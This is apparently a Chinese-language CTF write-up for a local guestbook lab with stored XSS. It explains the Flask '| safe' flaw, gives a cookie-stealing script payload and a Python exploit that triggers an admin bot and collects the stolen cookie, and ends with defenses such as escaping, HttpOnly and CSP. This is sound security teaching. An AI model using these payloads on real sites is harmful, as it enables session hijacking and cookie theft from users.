# XSS 跨站脚本攻击

## 题目信息

- **题目名称**：留言板的秘密
- **难度**：★★☆☆☆
- **考点**：Stored XSS、Cookie 劫持、Admin Bot

## 题目描述

有一个留言板应用，管理员会定期查看留言。你可以在留言中写入特殊内容，当管理员访问时，就能获取管理员的 Cookie。

## 解法步骤

### 第一步：信息收集

打开页面，发现是一个留言板（Guestbook），用户可以提交留言，留言会展示在页面上。

在页面上可以看到一个「通知管理员审核」的链接，说明后台有管理员 Bot 会访问这个页面。

### 第二步：寻找漏洞

查看留言内容在页面中的渲染方式。通过查看页面源码可以发现，留言内容被放在 `{{ c.content | safe }}` 中。Flask 的 `| safe` 过滤器会关闭 Jinja2 的自动转义，这意味着 HTML/JavaScript 代码不会被转义，直接渲染。

这就是一个典型的**存储型 XSS（Stored XSS）**漏洞。

### 第三步：构造 Payload

构造一个 JavaScript payload，当管理员访问页面时，将 Cookie 发送到攻击者的服务器：

```html
<script>fetch("/steal?c="+document.cookie)</script>
```

> **注意**：在发送 POST 请求时，`+` 号需要正确编码，否则会被解析为空格。在 Python 的 `requests` 库中，直接传递字符串即可，它会自动处理编码。

### 第四步：触发并获取 Flag

1. 提交包含 XSS payload 的留言
2. 点击「通知管理员审核」，触发 Bot 访问页面
3. Bot 携带了 `flag` Cookie，当它访问页面时，XSS 脚本会执行
4. 脚本将 Cookie 发送到 `/steal` 端点
5. 访问 `/log` 查看被盗取的数据

**自动化 Exploit：**

```python
#!/usr/bin/env python3
import requests
import time

BASE = 'http://127.0.0.1:13386'

payload = '<script>fetch("/steal?c="+document.cookie)</script>'
requests.post(f'{BASE}/comment', data={'content': payload})
requests.get(f'{BASE}/report')

for i in range(20):
    r = requests.get(f'{BASE}/log')
    if r.text and r.text != '(empty)':
        print(f'stolen: {r.text}')
        break
    time.sleep(1)
```

## 漏洞原理

### 存储型 XSS

存储型 XSS 是最危险的 XSS 类型之一。攻击者将恶意脚本"存储"在服务器上（数据库、文件、内存等），当其他用户访问包含该内容的页面时，脚本就会执行。

在本例中：
1. 攻击者提交包含 XSS 的留言
2. 服务器将留言存储在内存列表中
3. 管理员 Bot 访问页面，服务器渲染留言内容（未转义）
4. 恶意脚本在管理员的浏览器中执行
5. 脚本将管理员的 Cookie 发送给攻击者

### 防御方法

- 不要使用 `| safe` 过滤器直接输出用户内容
- 对用户输入进行 HTML 实体编码（`<` → `&lt;`，`>` → `&gt;` 等）
- 设置 Cookie 的 `HttpOnly` 属性，使 JavaScript 无法读取
- 实施 CSP（Content Security Policy）策略
